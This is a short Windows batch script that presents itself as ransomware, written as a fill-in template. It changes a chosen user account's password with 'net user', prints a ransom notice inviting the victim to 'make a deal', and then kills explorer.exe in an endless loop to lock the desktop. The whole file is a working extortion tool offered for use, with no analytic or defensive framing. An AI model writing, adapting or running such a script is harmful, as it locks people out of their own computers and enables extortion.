@echo off
title any title here
color 4
echo 
PING 127.0.0.1 -n 1 -w 3000 >NUL
color 0a
PING 127.0.0.1 -n 1 -w 3000 >NUL
set /p username=enter computer username:
net user %username% set password for ransomware here
echo
echo
echo
echo RansomWare enabled, contact information here so you can make a deal with the infected owner
echo
echo
PING 127.0.0.1 -n 1 -w 1500 >NUL
:k
taskkill /f /im explorer.exe
goto k
